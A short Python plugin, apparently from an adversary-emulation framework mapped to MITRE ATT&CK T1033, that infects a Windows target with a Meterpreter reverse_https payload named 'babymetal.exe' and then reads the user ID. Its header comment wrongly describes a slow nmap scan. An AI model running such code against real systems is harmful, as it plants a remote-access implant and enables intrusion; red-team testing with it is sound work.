#!/usr/bin/env python3

# A plugin to nmap targets slow motion, to evade sensors

from plugins.base.attack import AttackPlugin
from app.metasploit import MetasploitInstant


class MetasploitGetuidPlugin(AttackPlugin):

    # Boilerplate
    name = "metasploit_getuid"
    description = "Getuid"
    ttp = "T1033"
    references = ["https://attack.mitre.org/techniques/T1033/"]

    required_files = []    # Files shipped with the plugin which are needed by the kali tool. Will be copied to the kali share

    def __init__(self):
        super().__init__()
        self.plugin_path = __file__

    def run(self, targets):
        """ Run the command

        @param targets: A list of targets, ip addresses will do
        """

        res = ""
        payload_type = "windows/x64/meterpreter/reverse_https"
        payload_name = "babymetal.exe"
        target = self.targets[0]

        metasploit = MetasploitInstant(self.metasploit_password,
                                       attack_logger=self.attack_logger,
                                       attacker=self.attacker_machine_plugin,
                                       username=self.metasploit_user)

        metasploit.smart_infect(target,
                                payload=payload_type,
                                payload_name=payload_name,
                                architecture="x64")

        uid = metasploit.getuid(target)
        print(f"UID: {uid}")

        return res
